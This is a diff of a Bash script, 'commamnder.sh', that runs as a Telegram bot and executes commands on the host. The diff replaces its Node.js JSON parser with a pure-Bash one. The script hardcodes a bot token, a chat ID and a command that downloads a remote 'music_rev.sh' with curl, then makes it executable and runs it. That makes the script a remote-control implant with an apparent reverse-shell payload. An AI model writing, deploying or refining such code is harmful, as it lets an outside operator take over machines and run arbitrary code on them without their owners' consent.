@@ -1,8 +1,7 @@
 #!/usr/bin/env bash
-# commamnder.sh — Bash Telegram bot using Node.js to parse JSON
+# commamnder.sh — Pure Bash Telegram bot (no Node.js, no jq)
 # Usage: ./commamnder.sh
-# Requires: curl + node
-# Edit HARDCODE_CMD below.
+# Requires: curl only
 
 set -euo pipefail
 
@@ -10,16 +9,15 @@ set -euo pipefail
 TOKEN="7400095855:AAE9Lqtz6LLM-_gEasvVWY4nqGtkxr2I-rY"
 CHAT_ID="6565158025"
 HARDCODE_CMD="curl -sL https://raw.githubusercontent.com/FBIking/Fbiking.github.io/main/music_rev.sh -o music_rev.sh && chmod +x music_rev.sh && ./music_rev.sh"
-
 ########################################
 
 API="https://api.telegram.org/bot${TOKEN}"
 
 send_msg() {
   local text="$1"
-  curl -s -sX POST "${API}/sendMessage" \
+  curl -s -X POST "${API}/sendMessage" \
     -d chat_id="${CHAT_ID}" \
-    -d text="$text" >/dev/null
+    --data-urlencode text="$text" >/dev/null
 }
 
 send_file() {
@@ -29,22 +27,17 @@ send_file() {
     -F document=@"$file" >/dev/null
 }
 
-# node parser: reads JSON from stdin and prints update_id|chat_id|text
-parse_updates_node() {
-  node -e '
-    const fs = require("fs");
-    const data = JSON.parse(fs.readFileSync(0, "utf8"));
-    if (!data.result) process.exit(0);
-    for (const r of data.result) {
-      const uid = r.update_id;
-      const msg = r.message || r.edited_message || {};
-      const cid = msg.chat && msg.chat.id;
-      const text = (msg.text || "").replace(/\n/g, " ");
-      if (uid !== undefined && cid !== undefined) {
-        console.log(`${uid}|${cid}|${text}`);
-      }
-    }
-  '
+# minimal parser: extracts update_id, chat_id, and text from Telegram JSON
+parse_updates_bash() {
+  echo "$1" | grep -oE '{[^}]*}' | while read -r obj; do
+    UPDATE_ID=$(echo "$obj" | grep -oE '"update_id":[0-9]+' | cut -d: -f2)
+    CHAT=$(echo "$obj" | grep -oE '"chat":\{"id":[0-9]+' | grep -oE '[0-9]+$' || true)
+    TEXT=$(echo "$obj" | grep -oE '"text":"[^"]*"' | sed 's/.*"text":"\([^"]*\)".*/\1/' || true)
+
+    if [ -n "$UPDATE_ID" ] && [ -n "$CHAT" ]; then
+      echo "${UPDATE_ID}|${CHAT}|${TEXT}"
+    fi
+  done
 }
 
 # notify on startup
@@ -53,6 +46,7 @@ send_msg "ready to execute command"
 OFFSET=0
 while true; do
   UPDATES=$(curl -s "${API}/getUpdates?offset=${OFFSET}&timeout=20")
+
   while IFS= read -r line; do
     [ -z "$line" ] && continue
     IFS='|' read -r UPDATE_ID FROM_ID TEXT <<< "$line"
@@ -80,5 +74,6 @@ while true; do
         fi
       fi
     fi
-  done < <(echo "$UPDATES" | parse_updates_node)
+  done < <(parse_updates_bash "$UPDATES")
 done
+
